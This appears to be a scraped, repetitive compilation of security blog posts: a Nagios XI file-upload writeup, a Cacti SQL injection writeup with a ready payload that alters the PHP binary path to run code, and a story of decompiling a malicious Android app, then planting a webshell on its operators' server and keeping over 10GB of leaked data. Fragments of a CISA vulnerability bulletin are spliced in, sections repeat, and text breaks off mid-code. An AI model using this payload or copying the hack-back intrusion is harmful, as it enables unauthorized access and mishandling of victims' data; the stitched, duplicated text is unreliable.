## [CVE-2021-3277 – Nagios XI <= 5.7.5 Remote Code Execution](https://asaf.me/2021/01/21/nagios-xi-5-7-5-remote-code-execution/)

Nagios XI <= 5.7.5 allows authenticated admins to upload arbitrary files due to improper validation of the rename functionality in custom-includes component.
With the custom includes components we can upload various file types such as .css, .js, .png, and more.
After uploading an image file, we can rename the file, the renaming code is pretty straightforward:

```
function rename_file()
{
    $error = false;
    $id = grab_request_var('id', '');
    $name = grab_request_var('name', '');
    $newname = stripcslashes(trim($name));
    if (empty($id) || empty($name)) { $error = true; }

    if (!$error) {
        $images = get_array_option('custom_includes_files_images');
        $i = $images[$id];

        // Rename the file and send back json
        $x = rename($i['dir'].'/'.$i['name'], $i['dir'].'/'.$newname);
        if ($x === false) {
            $error = true;
        } else {
            // Rename the database entry
            $images[$id]['name'] = $newname;
            set_array_option('custom_includes_files_images', $images);
        }
    }

    if ($error) {
        echo json_encode(array('error' => 1, 'msg' => _('Could not rename file. Check file permissions.')));
    } else {
        echo json_encode(array('error' => 0, 'msg' => _('Renamed successfully')));
    }
}
```

As you can see, it takes the id of the old image, the name of the new image, and then renaming it.
There is no file name is validation at all, which allows the attacker not only to directory traversal but also to rename the file with any extension we want.
Which as a result, the attacker can upload arbitrary files.

## [CVE-2020-35701 – Cacti 1.2.0 – 1.2.16 SQL Injection](https://asaf.me/2020/12/15/cacti-1-2-0-to-1-2-16-sql-injection/)

This one is pretty straightforward and was found pretty quick

An SQL injection in the latest version of cacti.

In order to trigger the vulnerability you just need to enter this url: cacti/data\_debug.php?action=ajax\_hosts&site\_id=11SQLInjection

Because of how PHP behaves, the check:

```
if (get_request_var('site_id') > 0) {
   $sql_where = 'site_id = ' . get_request_var('site_id');
}
```

will pass when the parameter starts with a number, and in the end the system will try to execute the following query:

```
SELECT h1.*
FROM host AS h1
         INNER JOIN (SELECT DISTINCT id
                     FROM (SELECT h.*, uap0.user_id AS user0, uap1.user_id AS user1, uap2.user_id AS user2
                           FROM host AS h
                                    LEFT JOIN graph_local AS gl ON h.id = gl.host_id
                                    LEFT JOIN graph_templates_graph AS gtg ON gl.id = gtg.local_graph_id
                                    LEFT JOIN graph_templates AS gt ON gt.id = gl.graph_template_id
                                    LEFT JOIN host_template AS ht ON h.host_template_id = ht.id
                                    LEFT JOIN user_auth_perms AS uap0
                                              ON (gl.id = uap0.item_id AND uap0.type = 1 AND uap0.user_id = 1)
                                    LEFT JOIN user_auth_perms AS uap1
                                              ON (gl.host_id = uap1.item_id AND uap1.type = 3 AND uap1.user_id = 1)
                                    LEFT JOIN user_auth_perms AS uap2
                                              ON (gl.graph_template_id = uap2.item_id AND uap2.type = 4 AND
                                                  uap2.user_id = 1)
                           WHERE site_id = <strong>11sql_injection</strong>) AS rs1) AS rs2 ON rs2.id = h1.id;
select 1 # AND hostname LIKE '%hostname%' OR description LIKE '%description%' OR notes LIKE '%notes%' AND h.disabled=""
HAVING (user0 IS NULL OR (user1 IS NULL OR user2 IS NULL)) ) AS rs1 ) AS rs2
ON <a rel="noreferrer noopener" href="http://rs2.id/" target="_blank">rs2.id</a>=<a rel="noreferrer noopener" href="http://h1.id/" target="_blank">h1.id</a>
ORDER BY description LIMIT 30
```

If we will execute something like this:

```
cacti/data_debug.php?action=ajax_hosts&amp;site_id=11) AS rs1   ) AS rs2   ON rs2.id=h1.id;update settings set value='php -r "file_put_contents(\'/tmp/a\',\'aaa\'); "' where name='path_php_binary';-- -
```

We will manage to execute code when we will visit /cacti/host.php?action=reindex

## [Attacking the attackers](https://asaf.me/2018/07/23/attacking-the-attackers/)

## Introduction

One day evening while I was sitting on the couch I saw on the news that someone exposed a malicious Android application that some group of hackers built.

I just opened a random news website to check the application name – and find out its called “GlanceLove”.

## Getting a little bit deeper

After finding the apk and download it I decompiled it using [JDAX](https://github.com/skylot/jadx) and the first thing I did is to search for an “http” string (I assumed it uses HTTP protocol to leaking data).

The thing that pops immediately from the search was that the application used the “HttpURLConnection” class, which made me pretty sure that the application used a web server to leak the data, another thing is that I didn’t see is a string of the URL it should connect to, so I needed to read some code.

One of the functions used the “HttpURLConnection”  was called m7665a:

```
    public static String m7665a(String str, byte[] bArr) {
        String str2;
        Throwable th;
        HttpURLConnection httpURLConnection = null;
        try {
            HttpURLConnection httpURLConnection2 = (HttpURLConnection) new URL(str).openConnection();
            try {
                httpURLConnection2.setRequestMethod(f5386b);
                httpURLConnection2.setRequestProperty(f5387c, f5388d);
                httpURLConnection2.setUseCaches(false);
                httpURLConnection2.setDoInput(true);
                httpURLConnection2.setDoOutput(true);
                DataOutputStream dataOutputStream = new DataOutputStream(httpURLConnection2.getOutputStream());
                dataOutputStream.write(bArr);
                dataOutputStream.flush();
                dataOutputStream.close();
                ...
                ...
}
```

So this function received 2 parameters: str which is the URL, and bArr which is the data it sends to the server. We also can see that the request method defined in the f5386b variable and the request property defined in f5387c and f5388d:

```
private static final String f5386b = C1559l.m7683a(new C1552g[]{C1552g.P, C1552g.O, C1552g.S, C1552g.T});
private static final String f5387c = C1559l.m7683a(new C1552g[]{C1552g.C, C1552g.o, C1552g.n, C1552g.t, C1552g.e, C1552g.n, C1552g.t}).concat("-").concat(C1559l.m7683a(new C1552g[]{C1552g.T, C1552g.y, C1552g.p, C1552g.e}));
private static final String f5388d = C1559l.m7683a(new C1552g[]{C1552g.a, C1552g.p, C1552g.p, C1552g.l, C1552g.i, C1552g.c, C1552g.a, C1552g.t, C1552g.i, C1552g.o, C1552g.n})M.concat("/x").concat("-").concat(C1559l.m7683a(new C1552g[]{C1552g.w, C1552g.w, C1552g.w})).concat("-").concat(C1559l.m7683a(new C1552g[]{C1552g.f, C1552g.o, C1552g.r, C1552g.m})).concat("-").concat(C1559l.m7683a(new C1552g[]{C1552g.u, C1552g.r, C1552g.l, C1552g.e, C1552g.n, C1552g.c, C1552g.o, C1552g.d, C1552g.e, C1552g.d}));

```

The attackers used [ProGuard](https://sourceforge.net/projects/proguard/) to obfuscate the strings and the functions names, which explain why I couldn’t find the URL string. Lucky me, you can see immediately what those strings contain:

```
private static final String f5386b = "POST"
private static final String f5387c = "Content-Type"
private static final String f5388d = "Application/x-www-form-urlencoded"
```

I checked which functions are using the m7665a function and the result was:

```
private static void m7672b(File file) {
    C1548e.m7665a(C1489a.m7489b(), C1551f.m7671a(file, C1489a.f5198i)).trim();
}
public static String m7489b() {
    return f5199j + C1489a.m7487a() + f5201l;
}
public static String m7487a() {
    C1545b c1545b = new C1545b(f5203n.getFilesDir().getAbsolutePath(), f5202m);
    if (c1545b.exists()) {
        String str = new String(c1545b.m7647a());
        if (!(str == null || str.isEmpty())) {
            return str;
        }
    }
    return f5204o;
}
```

So m7672b called m7665a with the URL defined at m7489b, which after translation returns “HTTP://WWW.GLANCELOVE.COM/APPS/d/p/OP.PHP” (m7487a does something but in the end it returns the f5204o which contains the website URL)

So now I know the full URL (After I test it I realized it should be in lowercase) the application connects to and have a lot of strings:

```
public static final String f5190a = ".ZIP"
public static final String f5191b = ".DATA"
public static final String f5192c = ".APK"
public static final byte[] f5193d = "A".getBytes();
public static final byte[] f5194e = "B".getBytes();
public static final byte[] f5195f = "F".getBytes();
public static final byte[] f5196g = "CCC".getBytes();
public static final byte[] f5197h = "D".getBytes();
public static final byte[] f5198i = "E".getBytes();
public static final String f5199j = "HTTP://"
public static final String f5200k = "TCP://";
public static final String f5201l = "/APPS/d/p/OP.PHP"
public static final String f5202m = "IP.TXT"
private static Context f5203n = App.m7476a();
private static String f5204o = "WWW.GLANCELOVE.COM"
private static byte[] f5394b = "devId="
private static byte[] f5395c = "&op="
private static byte[] f5396d = "&fName="
private static byte[] f5397e = "&data="
private static String f5398f = "true"
```

So a common sense is that all I need to do is to send a POST request to the URL with the parameters devId, op, fName, and data.

```
private static byte[] m7671a(File file, byte[] bArr) {
    ...
    Object obj = new byte[(((((f5394b.length + a2.length) + f5396d.length) + a.length) + f5395c.length) + bArr.length)];
    ...
    System.arraycopy(bArr, 0, obj, (a.length + ((a2.length + f5394b.length) + f5396d.length)) + f5395c.length, bArr.length);
}
public static int m7668a(File file) {
    ...
    Object a = C1551f.m7671a(file, C1489a.f5196g);
    ...
}
private static void m7672b(File file) {
    C1548e.m7665a(C1489a.m7489b(), C1551f.m7671a(file, C1489a.f5198i)).trim();
}
private static long m7674c(File file) {
        ...
        return Long.parseLong(C1548e.m7665a(C1489a.m7489b(), C1551f.m7671a(file, C1489a.f5197h)).trim());
}
```

m7671a build the opId by the value which passed from the functions m7668a, m7672b and m7674c which use the values “CCC”, “E” and “D”, respectively.

I still had no idea what those values do, so I tried them all – I sent a POST request with the payload: devId=123123&op=CCC&fName=123&data=abc

And the response I got was 38, which is exactly the payload’s length I sent, so now I assumed I managed to upload my file somewhere, but I had no clue where is it in the server.

After a few educated guesses, I find out that the path is /apps/d/uploads/dev/123123/123!

![](https://asaf.me/wp-content/uploads/2018/07/files-133x300.jpg)

Game over. I uploaded a webshell and find out that this app has been installed in more than 500[!] cellphones and it leaked more than 10GB of data full of goods.

I had to think what can I do with think what can I do with that data – I’ll leave it for another post 🙂

# CVE-2021-3277 – Nagios XI <= 5.7.5 Remote Code Execution

Nagios XI <= 5.7.5 allows authenticated admins to upload arbitrary files due to improper validation of the rename functionality in custom-includes component.
With the custom includes components we can upload various file types such as .css, .js, .png, and more.
After uploading an image file, we can rename the file, the renaming code is pretty straightforward:

```
function rename_file()
{
    $error = false;
    $id = grab_request_var('id', '');
    $name = grab_request_var('name', '');
    $newname = stripcslashes(trim($name));
    if (empty($id) || empty($name)) { $error = true; }

    if (!$error) {
        $images = get_array_option('custom_includes_files_images');
        $i = $images[$id];

        // Rename the file and send back json
        $x = rename($i['dir'].'/'.$i['name'], $i['dir'].'/'.$newname);
        if ($x === false) {
            $error = true;
        } else {
            // Rename the database entry
            $images[$id]['name'] = $newname;
            set_array_option('custom_includes_files_images', $images);
        }
    }

    if ($error) {
        echo json_encode(array('error' => 1, 'msg' => _('Could not rename file. Check file permissions.')));
    } else {
        echo json_encode(array('error' => 0, 'msg' => _('Renamed successfully')));
    }
}
```

As you can see, it takes the id of the old image, the name of the new image, and then renaming it.
There is no file name is validation at all, which allows the attacker not only to directory traversal but also to rename the file with any extension we want.
Which as a result, the attacker can upload arbitrary files.

# Attacking the attackers

## Introduction

One day evening while I was sitting on the couch I saw on the news that someone exposed a malicious Android application that some group of hackers built.

How did they found out the application is used for malicious proposes? well, I guess it wasn’t too hard – The hackers created a fake facebook accounts with pictures of some hot random girls and contacted Israeli guys (the “victim”) using the Facebook’s chat and told the victim that if he wants to video chat with them then he has to download the android application they like so much.

After the victim downloaded the application he finds out that nothing works, the hottie that he just talked with disappeared and left with a broken heart and his pride in his hands.

I just opened a random news website to check the application name – and find out its called “GlanceLove”.

## Getting a little bit deeper

After finding the apk and download it I decompiled it using [JDAX](https://github.com/skylot/jadx) and the first thing I did is to search for an “http” string (I assumed it uses HTTP protocol to leaking data).

The thing that pops immediately from the search was that the application used the “HttpURLConnection” class, which made me pretty sure that the application used a web server to leak the data, another thing is that I didn’t see is a string of the URL it should connect to, so I needed to read some code.

One of the functions used the “HttpURLConnection”  was called m7665a:

```
    public static String m7665a(String str, byte[] bArr) {
        String str2;
        Throwable th;
        HttpURLConnection httpURLConnection = null;
        try {
            HttpURLConnection httpURLConnection2 = (HttpURLConnection) new URL(str).openConnection();
            try {
                httpURLConnection2.setRequestMethod(f5386b);
                httpURLConnection2.setRequestProperty(f5387c, f5388d);
                httpURLConnection2.setUseCaches(false);
                httpURLConnection2.setDoInput(true);
                httpURLConnection2.setDoOutput(true);
                DataOutputStream dataOutputStream = new DataOutputStream(httpURLConnection2.getOutputStream());
                dataOutputStream.write(bArr);
                dataOutputStream.flush();
                dataOutputStream.close();
                ...
                ...
}
```

So this function received 2 parameters: str which is the URL, and bArr which is the data it sends to the server. We also can see that the request method defined in the f5386b variable and the request property defined in f5387c and f5388d:

```
private static final String f5386b = C1559l.m7683a(new C1552g[]{C1552g.P, C1552g.O, C1552g.S, C1552g.T});
private static final String f5387c = C1559l.m7683a(new C1552g[]{C1552g.C, C1552g.o, C1552g.n, C1552g.t, C1552g.e, C1552g.n, C1552g.t}).concat("-").concat(C1559l.m7683a(new C1552g[]{C1552g.T, C1552g.y, C1552g.p, C1552g.e}));
private static final String f5388d = C1559l.m7683a(new C1552g[]{C1552g.a, C1552g.p, C1552g.p, C1552g.l, C1552g.i, C1552g.c, C1552g.a, C1552g.t, C1552g.i, C1552g.o, C1552g.n})M.concat("/x").concat("-").concat(C1559l.m7683a(new C1552g[]{C1552g.w, C1552g.w, C1552g.w})).concat("-").concat(C1559l.m7683a(new C1552g[]{C1552g.f, C1552g.o, C1552g.r, C1552g.m})).concat("-").concat(C1559l.m7683a(new C1552g[]{C1552g.u, C1552g.r, C1552g.l, C1552g.e, C1552g.n, C1552g.c, C1552g.o, C1552g.d, C1552g.e, C1552g.d}));

```

The attackers used [ProGuard](https://sourceforge.net/projects/proguard/) to obfuscate the strings and the functions names, which explain why I couldn’t find the URL string. Lucky me, you can see immediately what those strings contain:

```
private static final String f5386b = "POST"
private static final String f5387c = "Content-Type"
private static final String f5388d = "Application/x-www-form-urlencoded"
```

I checked which functions are using the m7665a function and the result was:

```
private static void m7672b(File file) {
    C1548e.m7665a(C1489a.m7489b(), C1551f.m7671a(file, C1489a.f5198i)).trim();
}
public static String m7489b() {
    return f5199j + C1489a.m7487a() + f5201l;
}
public static String m7487a() {
    C1545b c1545b = new C1545b(f5203n.getFilesDir().getAbsolutePath(), f5202m);
    if (c1545b.exists()) {
        String str = new String(c1545b.m7647a());
        if (!(str == null || str.isEmpty())) {
            return str;
        }
    }
    return f5204o;
}
```

So m7672b called m7665a with the URL defined at m7489b, which after translation returns “HTTP://WWW.GLANCELOVE.COM/APPS/d/p/OP.PHP” (m7487a does something but in the end it returns the f5204o which contains the website URL)

So now I know the full URL (After I test it I realized it should be in lowercase) the application connects to and have a lot of strings:

```
public static final String f5190a = ".ZIP"
public static final String f5191b = ".DATA"
public static final String f5192c = ".APK"
public static final byte[] f5193d = "A".getBytes();
public static final byte[] f5194e = "B".getBytes();
public static final byte[] f5195f = "F".getBytes();
public static final byte[] f5196g = "CCC".getBytes();
public static final byte[] f5197h = "D".getBytes();
public static final byte[] f5198i = "E".getBytes();
public static final String f5199j = "HTTP://"
public static final String f5200k = "TCP://";
public static final String f5201l = "/APPS/d/p/OP.PHP"
public static final String f5202m = "IP.TXT"
private static Context f5203n = App.m7476a();
private static String f5204o = "WWW.GLANCELOVE.COM"
private static byte[] f5394b = "devId="
private static byte[] f5395c = "&op="
private static byte[] f5396d = "&fName="
private static byte[] f5397e = "&data="
private static String f5398f = "true"
```

So a common sense is that all I need to do is to send a POST request to the URL with the parameters devId, op, fName, and data.

devId, fName, and data are pretty easy to guess, but I had no idea what I should put in the op, so I checked it:

```
private static byte[] m7671a(File file, byte[] bArr) {
    ...
    Object obj = new byte[(((((f5394b.length + a2.length) + f5396d.length) + a.length) + f5395c.length) + bArr.length)];
    ...
    System.arraycopy(bArr, 0, obj, (a.length + ((a2.length + f5394b.length) + f5396d.length)) + f5395c.length, bArr.length);
}
public static int m7668a(File file) {
    ...
    Object a = C1551f.m7671a(file, C1489a.f5196g);
    ...
}
private static void m7672b(File file) {
    C1548e.m7665a(C1489a.m7489b(), C1551f.m7671a(file, C1489a.f5198i)).trim();
}
private static long m7674c(File file) {
        ...
        return Long.parseLong(C1548e.m7665a(C1489a.m7489b(), C1551f.m7671a(file, C1489a.f5197h)).trim());
}
```

m7671a build the opId by the value which passed from the functions m7668a, m7672b and m7674c which use the values “CCC”, “E” and “D”, respectively.

I still had no idea what those values do, so I tried them all – I sent a POST request with the payload: devId=123123&op=CCC&fName=123&data=abc

And the response I got was 38, which is exactly the payload’s length I sent, so now I assumed I managed to upload my file somewhere, but I had no clue where is it in the server.

After a few educated guesses, I find out that the path is /apps/d/uploads/dev/123123/123!

Game over. I uploaded a webshell and find out that this app has been installed in more than 500[!] cellphones and it leaked more than 10GB of data full of goods.

I had to think what can I do with think what can I do with that data – I’ll leave it for another post 🙂

   Very nicely summed up. I did the above in 2016, and you haven’t missed any of the steps. However, it will be great if you can mention de-obfuscation in detail, including tool/s for the same.

   Well done!

   As far as I’ve understood, that data contains sensitive information, therefore I suggest you to send it over to Troy Hunt[0].

   He’s the main behind haveibeenpwned[1] website; I’m pretty sure he’ll be glad include the data you gathered, and make the internet a (bit) safer place 🙂

# CVE-2020-35701 – Cacti 1.2.0 – 1.2.16 SQL Injection

This one is pretty straightforward and was found pretty quick

An SQL injection in the latest version of cacti.

In order to trigger the vulnerability you just need to enter this url: cacti/data\_debug.php?action=ajax\_hosts&site\_id=11SQLInjection

Because of how PHP behaves, the check:

```
if (get_request_var('site_id') > 0) {
   $sql_where = 'site_id = ' . get_request_var('site_id');
}
```

will pass when the parameter starts with a number, and in the end the system will try to execute the following query:

```
SELECT h1.*
FROM host AS h1
         INNER JOIN (SELECT DISTINCT id
                     FROM (SELECT h.*, uap0.user_id AS user0, uap1.user_id AS user1, uap2.user_id AS user2
                           FROM host AS h
                                    LEFT JOIN graph_local AS gl ON h.id = gl.host_id
                                    LEFT JOIN graph_templates_graph AS gtg ON gl.id = gtg.local_graph_id
                                    LEFT JOIN graph_templates AS gt ON gt.id = gl.graph_template_id
                                    LEFT JOIN host_template AS ht ON h.host_template_id = ht.id
                                    LEFT JOIN user_auth_perms AS uap0
                                              ON (gl.id = uap0.item_id AND uap0.type = 1 AND uap0.user_id = 1)
                                    LEFT JOIN user_auth_perms AS uap1
                                              ON (gl.host_id = uap1.item_id AND uap1.type = 3 AND uap1.user_id = 1)
                                    LEFT JOIN user_auth_perms AS uap2
                                              ON (gl.graph_template_id = uap2.item_id AND uap2.type = 4 AND
                                                  uap2.user_id = 1)
                           WHERE site_id = <strong>11sql_injection</strong>) AS rs1) AS rs2 ON rs2.id = h1.id;
select 1 # AND hostname LIKE '%hostname%' OR description LIKE '%description%' OR notes LIKE '%notes%' AND h.disabled=""
HAVING (user0 IS NULL OR (user1 IS NULL OR user2 IS NULL)) ) AS rs1 ) AS rs2
ON <a rel="noreferrer noopener" href="http://rs2.id/" target="_blank">rs2.id</a>=<a rel="noreferrer noopener" href="http://h1.id/" target="_blank">h1.id</a>
ORDER BY description LIMIT 30
```

If we will execute something like this:

```
cacti/data_debug.php?action=ajax_hosts&amp;site_id=11) AS rs1   ) AS rs2   ON rs2.id=h1.id;update settings set value='php -r "file_put_contents(\'/tmp/a\',\'aaa\'); "' where name='path_php_binary';-- -
```

We will manage to execute code when we will visit /cacti/host.php?action=reindex

The CISA Weekly Vulnerability Summary Bulletin is created using information from the NIST [NVD](https://nvd.nist.gov/vuln/search). In some cases, the vulnerabilities in the Bulletin may not yet have assigned CVSS scores. Please visit NVD for updated vulnerability entries, which include CVSS scores once they are available.

## High Vulnerabilities

| Primary Vendor — Product | Description | Published | CVSS Score | Source & Patch Info |
| --- | --- | --- | --- | --- |
| agentejo — cockpit | Cockpit before 0.6.1 allows an attacker to inject custom PHP code and achieve Remote Command Execution via registerCriteriaFunction in lib/MongoLite/Database.php, as demonstrated by values in JSON data to the /auth/check or /auth/requestreset URI. | 2021-01-08 | [7.5](https://nvd.nist.gov/cvss.cfm?version=2&name=CVE-2020-35131&vector=AV:N/AC:L/Au:N/C:P/I:P/A:P "CVSS V2 Score") | [CVE-2020-35131](https://nvd.nist.gov/nvd.cfm?cvename=CVE-2020-35131) [MISC](https://github.com/agentejo/cockpit/commits/next/lib/MongoLite/Database.php) [MISC](https://github.com/agentejo/cockpit/releases/tag/0.6.1) [MISC](https://www.exploit-db.com/exploits/49390) |
| apache — dubbo | A deserialization vulnerability existed in dubbo 2.7.5 and its earlier versions, which could lead to malicious code execution. Most Dubbo users use Hessian2 as the default serialization/deserialization protool, during Hessian2 deserializing the HashMap object, some functions in the classes stored in HasMap will be executed after a series of program calls, however, those special functions may cause remote command execution. For example, the hashCode() function of the EqualsBean class in rome-1.7.0.jar will cause the remotely load malicious classes and execute malicious code by constructing a malicious request. This issue was fixed in Apache Dubbo 2.6.9 and 2.7.8. | 2021-01-11 | [7.5](https://nvd.nist.gov/cvss.cfm?version=2&name=CVE-2020-11995&vector=AV:N/AC:L/Au:N/C:P/I:P/A:P "CVSS V2 Score") | [CVE-2020-11995](https://nvd.nist.gov/nvd.cfm?cvename=CVE-2020-11995) [MISC](https://lists.apache.org/thread.html/r5b2df4ef479209dc4ced457b3d58a887763b60b9354c3dc148b2eb5b%40%3Cdev.dubbo.apache.org%3E) |
| cisco — rv110w\_firmware | Multiple vulnerabilities in the web-based management interface of Cisco Small Business RV110W, RV130, RV130W, and RV215W Routers could allow an authenticated, remote attacker to execute arbitrary code or cause an affected device to restart unexpectedly. The vulnerabilities are due to improper validation of user-supplied input in the web-based management interface. An attacker could exploit these vulnerabilities by sending crafted HTTP requests to an affected device. A successful exploit could allow the attacker to execute arbitrary code as the root user on the underlying operating system or cause the device to reload, resulting in a denial of service (DoS) condition. To exploit these vulnerabilities, an attacker would need to have valid administrator credentials on the affected device. Cisco has not released software updates that address these vulnerabilities. | 2021-01-13 | [9](https://nvd.nist.gov/cvss.cfm?version=2&name=CVE-2021-1184&vector=AV:N/AC:L/Au:S/C:C/I:C/A:C "CVSS V2 Score") | [CVE-2021-1184](https://nvd.nist.gov/nvd.cfm?cvename=CVE-2021-1184) [CISCO](https://tools.cisco.com/security/center/content/CiscoSecurityAdvisory/cisco-sa-rv-overflow-WUnUgv4U) |

| coturn — coturn | Coturn is free open source implementation of TURN and STUN Server. Coturn before version 4.5.2 by default does not allow peers to connect and relay packets to loopback addresses in the range of `127.x.x.x`. However, it was observed that when sending a `CONNECT` request with the `XOR-PEER-ADDRESS` value of `0.0.0.0`, a successful response was received and subsequently, `CONNECTIONBIND` also received a successful response. Coturn then is able to relay packets to the loopback interface. Additionally, when coturn is listening on IPv6, which is default, the loopback interface can also be reached by making use of either `[::1]` or `[::]` as the peer address. By using the address `0.0.0.0` as the peer address, a malicious user will be able to relay packets to the loopback interface, unless `–denied-peer-ip=0.0.0.0` (or similar) has been specified. Since the default configuration implies that loopback peers are not allowed, coturn administrators may choose to not set the `denied-peer-ip` setting. The issue patched in version 4.5.2. As a workaround the addresses in the address block `0.0.0.0/8`, `[::1]` and `[::]` should be denied by default unless `–allow-loopback-peers` has been specified. | 2021-01-13 | not yet calculated | [CVE-2020-26262](https://nvd.nist.gov/nvd.cfm?cvename=CVE-2020-26262) [MISC](https://github.com/coturn/coturn/blob/57180ab60afcaeb13537e69ae8cb8aefd8f3f546/ChangeLog#L48) [MISC](https://github.com/coturn/coturn/commit/abfe1fd08d78baa0947d17dac0f7411c3d948e4d) [CONFIRM](https://github.com/coturn/coturn/security/advisories/GHSA-6g6j-r9rf-cm7p) |

| flatpak — flatpak | Flatpak is a system for building, distributing, and running sandboxed desktop applications on Linux. A bug was discovered in the `flatpak-portal` service that can allow sandboxed applications to execute arbitrary code on the host system (a sandbox escape). This sandbox-escape bug is present in versions from 0.11.4 and before fixed versions 1.8.5 and 1.9.4. The Flatpak portal D-Bus service (`flatpak-portal`, also known by its D-Bus service name `org.freedesktop.portal.Flatpak`) allows apps in a Flatpak sandbox to launch their own subprocesses in a new sandbox instance, either with the same security settings as the caller or with more restrictive security settings. For example, this is used in Flatpak-packaged web browsers such as Chromium to launch subprocesses that will process untrusted web content, and give those subprocesses a more restrictive sandbox than the browser itself. In vulnerable versions, the Flatpak portal service passes caller-specified environment variables to non-sandboxed processes on the host system, and in particular to the `flatpak run` command that is used to launch the new sandbox instance. A malicious or compromised Flatpak app could set environment variables that are trusted by the `flatpak run` command, and use them to execute arbitrary code that is not in a sandbox.

On Windows, if Git LFS operates on a malicious repository with a git.bat or git.exe file in the current directory, that program would be executed, permitting the attacker to execute arbitrary code. This does not affect Unix systems. This is the result of an incomplete fix for CVE-2020-27955. This issue occurs because on Windows, Go includes (and prefers) the current directory when the name of a command run does not contain a directory separator.

| juniper\_networks — junos\_os | An improper interpretation conflict of certain data between certain software components within the Juniper Networks Junos OS devices does not allow certain traffic to pass through the device upon receipt from an ingress interface filtering certain specific types of traffic which is then being redirected to an egress interface on a different VLAN. This causes a Denial of Service (DoS) to those clients sending these particular types of traffic. Such traffic being sent by a client may appear genuine, but is non-standard in nature and should be considered as potentially malicious, and can be targeted to the device, or destined through it for the issue to occur. This issues affects IPv4 and IPv6 traffic. An indicator of compromise may be found by checking log files. You may find that traffic on the input interface has 100% of traffic flowing into the device, yet the egress interface shows 0 pps leaving the device. For example: [show interfaces “interface” statistics detail] Output between two interfaces would reveal something similar to: Ingress, first interface: ——————– Interface Link Input packets (pps) Output packets (pps) et-0/0/0 Up 9999999999 (9999) 1 (0) ——————– Egress, second interface: ——————– Interface Link Input packets (pps) Output packets (pps) et-0/0/1 Up 0 (0) 9999999999 (0) ——————– Dropped packets will not show up in DDoS monitoring/protection counters as issue is not caused by anti-DDoS protection mechanisms.

| juniper\_networks — junos\_os | A vulnerability in Juniper Networks Junos OS allows an attacker to cause a Denial of Service (DoS) to the device by sending certain crafted protocol packets from an adjacent device with invalid payloads to the device. These crafted packets, which should be discarded, are instead replicated and sent to the RE. Over time, a Denial of Service (DoS) occurs. Continued receipt of these crafted protocol packets will cause an extended Denial of Service (DoS) condition, which may cause wider traffic impact due to protocol flapping.

| loxone — miniserver | Loxone Miniserver devices with firmware before 11.1 (aka 11.1.9.3) are unable to use an authentication method that is based on the “signature of the update package.” Therefore, these devices (or attackers who are spoofing these devices) can continue to use an unauthenticated cloud service for an indeterminate time period (possibly forever). Once an individual device’s firmware is updated, and authentication occurs once, the cloud service recategorizes the device so that authentication is subsequently always required, and spoofing cannot occur. | 2021-01-13 | not yet calculated | [CVE-2020-27488](https://nvd.nist.gov/nvd.cfm?cvename=CVE-2020-27488) [MISC](https://iot-lab-fh-ooe.github.io/loxone_clouddns_schwachstelle/) [MISC](https://iot-lab-fh-ooe.github.io/loxone_clouddns_vulnerability/) [MISC](https://www.loxone.com/dede/sicherheit-cloud-dns/) [MISC](https://www.loxone.com/enen/security-cloud-dns/) |

These entities can be configured to read arbitrary files from the file system and dump their contents in the final XML document to be migrated. If the files are dumped in properties included in the YAML file, it will be possible for an attacker to read them. If not, it is possible for an attacker to exfiltrate the contents of these files Out Of Band. This issue was addressed in 4.0.3 by ignoring ENTITY instructions in xml file. | 2021-01-15 | not yet calculated | [CVE-2021-21250](https://nvd.nist.gov/nvd.cfm?cvename=CVE-2021-21250) [MISC](https://github.com/theonedev/onedev/commit/9196fd795e87dab069b4260a3590a0ea886e770f) [CONFIRM](https://github.com/theonedev/onedev/security/advisories/GHSA-9pph-8gfc-6w2r) |
| onedev — onedev | OneDev is an all-in-one devops platform. In OneDev before version 4.0.3 there is a critical “zip slip” vulnerability. This issue may lead to arbitrary file write. The KubernetesResource REST endpoint untars user controlled data from the request body using TarUtils. TarUtils is a custom library method leveraging Apache Commons Compress. During the untar process, there are no checks in place to prevent an untarred file from traversing the file system and overriding an existing file. For a successful exploitation, the attacker requires a valid \_\_JobToken\_\_ which may not be possible to get without using any of the other reported vulnerabilities. But this should be considered a vulnerability in `io.onedev.commons.utils.TarUtils` since it lives in a different artifact and can affect other projects using it. This issue was addressed in 4.0.3 by validating paths in tar archive to only allow them to be in specified folder when extracted. | 2021-01-15 | not yet calculated | [CVE-2021-21251](https://nvd.nist.gov/nvd.cfm?cvename=CVE-2021-21251) [CONFIRM](https://github.com/theonedev/onedev/security/advisories/GHSA-2w6j-wc8c-9mq2) |
| open-iscsi — tcmu-runner | In Open-iSCSI tcmu-runner 1.3.x, 1.4.x, and 1.5.x through 1.5.2, xcopy\_locate\_udev in tcmur\_cmd\_handler.c lacks a check for transport-layer restrictions, allowing remote attackers to read or write files via directory traversal in an XCOPY request. For example, an attack can occur over a network if the attacker has access to one iSCSI LUN. NOTE: relative to CVE-2020-28374, this is a similar mistake in a different algorithm. | 2021-01-13 | not yet calculated | [CVE-2021-3139](https://nvd.nist.gov/nvd.cfm?cvename=CVE-2021-3139) [MLIST](http://www.openwall.com/lists/oss-security/2021/01/13/5) [MISC](https://bugzilla.suse.com/attachment.cgi?id=844938) [MISC](https://bugzilla.suse.com/show_bug.cgi?id=1178372) [CONFIRM](https://github.com/open-iscsi/tcmu-runner/pull/644) [MISC](https://www.openwall.com/lists/oss-security/2021/01/12/12) |
| opera — opera\_mini\_for\_android | Opera Mini for Android below 53.1 displays URL left-aligned in the address field. This allows a malicious attacker to craft a URL with a long domain name, e.g. www.safe.opera.com.attacker.com. With the URL being left-aligned, the user will only see the front part (e.g. www.safe.opera.com…) The exact amount depends on the phone screen size but the attacker can craft a number of different domains and target different phones. Starting with version 53.1 Opera Mini displays long URLs with the top-level domain label aligned to the right of the address field which mitigates the issue. | 2021-01-11 | not yet calculated | [CVE-2021-23253](https://nvd.nist.gov/nvd.cfm?cvename=CVE-2021-23253) [CONFIRM](https://security.opera.com/address-bar-spoofing-in-opera-mini-opera-security-advisories/) |

## [CVE-2021-3277 – Nagios XI <= 5.7.5 Remote Code Execution](https://asaf.me/2021/01/21/nagios-xi-5-7-5-remote-code-execution/)

Nagios XI <= 5.7.5 allows authenticated admins to upload arbitrary files due to improper validation of the rename functionality in custom-includes component.
With the custom includes components we can upload various file types such as .css, .js, .png, and more.
After uploading an image file, we can rename the file, the renaming code is pretty straightforward:

```
function rename_file()
{
    $error = false;
    $id = grab_request_var('id', '');
    $name = grab_request_var('name', '');
    $newname = stripcslashes(trim($name));
    if (empty($id) || empty($name)) { $error = true; }

    if (!$error) {
        $images = get_array_option('custom_includes_files_images');
        $i = $images[$id];

        // Rename the file and send back json
